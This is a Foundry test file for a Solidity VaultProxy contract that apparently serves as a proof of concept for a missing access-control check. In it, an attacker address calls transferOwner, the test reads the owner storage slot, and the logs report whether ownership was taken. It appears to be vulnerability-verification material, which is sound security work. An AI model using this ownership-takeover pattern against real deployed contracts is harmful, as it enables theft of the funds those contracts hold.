// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol";

contract VaultProxyTest is Test {
    VaultProxy vaultProxy;
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 initialOwnerSlotValue;

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.prank(owner, owner);
        vaultProxy = new VaultProxy{value: 1 ether}();
    }

    function testVerifyOwnerUnderflow() public {
        // Pre-trigger state recording
        console2.log("--- BEFORE-Trigger ---");
        bytes32 ownerSlot = bytes32(uint256(0));
        initialOwnerSlotValue = uint256(vm.load(address(vaultProxy), ownerSlot));
        console2.log("Pre-trigger owner slot value: %s", address(uint160(initialOwnerSlotValue)));
        console2.log("Pre-trigger owner verification status:", address(uint160(initialOwnerSlotValue)) == owner);

        // Trigger access control violation
        console2.log("--- Trigger: transferOwner(attacker) ---");
        console2.log("Caller address: %s", attacker);
        vm.prank(attacker); // Notice: attacker calls owner privilege function
        vaultProxy.transferOwner(attacker);

        // Post-trigger state verification
        console2.log("--- AFTER-Trigger ---");
        bytes32 attackerSlot = bytes32(uint256(0));
        uint256 currentOwnerValue = uint256(vm.load(address(vaultProxy), attackerSlot));
        console2.log("Post-trigger owner slot value: %s", address(uint160(currentOwnerValue)));
        
        // Access control verification
        bool brokeAccessControl = (address(uint160(currentOwnerValue)) == attacker);
        console2.log("Access control status:", brokeAccessControl ? "BROKEN" : "INTACT");
        console2.log("Critical condition met? %s", brokeAccessControl);
        
        // Final vulnerability verdict
        if (brokeAccessControl) {
            console2.log("Vulnerability Exists: transferOwner lacks address validation allowing non-owner access");
        } else {
            console2.log("Vulnerability not Exist: access control remains intact");
        }
    }
}